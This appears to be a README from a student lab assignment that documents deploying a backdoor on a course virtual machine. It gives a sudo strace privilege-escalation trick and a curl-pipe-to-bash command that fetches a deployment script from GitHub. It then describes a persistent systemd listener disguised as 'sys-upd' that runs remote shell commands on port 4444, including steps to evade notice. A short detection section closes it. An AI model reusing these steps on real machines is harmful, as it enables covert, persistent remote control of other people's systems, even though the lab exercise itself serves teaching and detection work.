# Project

Project File Overview<br><br>
Bash Scripts (Deployed on Target):

- backdoor: Deployment script

- sys-upd: Downloads and executes the server

- sys-upd.service: systemd service unit file

Python Scripts:

- sys.py: Backdoor listener (server side)

- access.py: Client interface (run from attacker machine)

# A) how to install it in the week4 virtual machine

Enable the host to communicate with the VM over port 4444, add this rule in VirtualBox:

Go to Settings > Network > Adapter 1 → click Port Forwarding

Add the following rule:<br>
Name: backdoor-link<br>
Protocol: TCP<br>
Host IP: 127.0.0.1<br>
Host Port: 4444<br>
Guest IP: (leave blank or default)<br>
Guest Port: 4444<br>

___________________________________

ssh into the week4 virtual machine:<br>
User: user<br>
Password: hill<br>

Note: (I analyzed the .pcapng file in Wireshark and identified an HTTP response containing user data. A hashed password for the user user stood out. Using John the Ripper with the rockyou.txt wordlist, I successfully cracked the hash and retrieved the password: hill.)

___________________________________


## Escalate Privileges
To escalate privileges use this command:<br><br>
Command: sudo strace -o /dev/null /bin/bash<br>
Command: cd (Change Directory)<br>
Command: curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bash/backdoor | bash<br>

___________________________________


Once this done, Clone the reopsitory in your system and navigate from terminal to Python folder directory and run <br>
`python access.py`

Password: week4

___________________________________

# B) how your backdoor works internally

- Our backdoor operates by deploying a persistent listener on the target machine using a Bash script (sys-upd) managed by a systemd service (sys-upd.service). This script opens TCP port 4444 and runs the Python server (sys.py) which continuously listens for incoming connections. 

- When a connection is received, it prompts for a password (week4) to authenticate the client. Upon successful login, the server receives and executes shell commands from the client (access.py) and sends back the results. 

- All communication is socket-based and occurs over the specified port, enabling the attacker to remotely control the host shell in real time while maintaining persistence across reboots.

___________________________________

# C) how your backdoor works internally

1. Remote Shell Access

- The sys.py script binds to port 4444 and listens for incoming connections. Once authenticated, it enters a loop waiting for shell commands from the attacker. The command is executed via subprocess.Popen() and results are sent back to the attacker.

2. Persistence

- Persistence is achieved using a systemd service (sys-upd.service). The backdoor is enabled to auto-start on boot using systemctl enable sys-upd, ensuring the listener runs continuously.

3. Configuration to get commands from:

- Commands are received over the network socket (TCP on port 4444). The sys.py server waits for incoming commands from the client and executes them directly.

4. Authentication

- The backdoor requires a password (week4) before allowing shell access. If the password is incorrect, the connection is closed and access is denied.

5. Hiding from Detection

- The backdoor is disguised as a system update script: sys-upd. It is placed in the /root directory and registered as a systemd service with a generic name.. Minimal console output and error handling are included to avoid raising suspicion.

___________________________________

# D) ideas on how yourbackdoor could be detected.

- The backdoor can be detected using tools like Wireshark by identifying unusual traffic on port 4444.It may also be exposed through system audits by spotting suspicious services like sys-upd.service or by detecting scripts fetched from GitHub. Security tools or EDRs could flag the listener's behavior of executing remote shell commands.


___________________________________


# Bonus Task:

Make sure [Escalate Privileges](#escalate-privileges) is done.

A script or program that will detect if the host is infected with your backdoor

Download the detection script<br><br>
curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bonus/detect_backdoor.sh -o detect_backdoor.sh

Make the script executable <br><br>
chmod +x detect_backdoor.sh

Run the script <br><br>
./detect_backdoor.sh

